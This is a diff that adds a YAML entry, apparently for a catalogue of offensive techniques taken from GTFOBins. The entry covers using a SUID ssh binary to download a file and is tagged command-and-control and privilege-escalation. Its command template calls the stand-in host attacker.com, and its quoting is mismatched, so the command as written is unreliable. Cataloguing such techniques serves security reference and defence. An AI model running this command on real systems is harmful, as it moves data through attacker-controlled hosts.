@@ -1,0 +1,24 @@
+id: gtfobins/ssh/download/suid
+type: binary
+platform: linux
+name: ssh
+phases:
+- command-and-control
+- privilege-escalation
+capabilities:
+- file-download
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: ssh user@attacker.com 'cat /path/to/input-file"
+references:
+- https://gtfobins.github.io/gtfobins/ssh/
+tags:
+- linux
+- unix
+- gtfobins
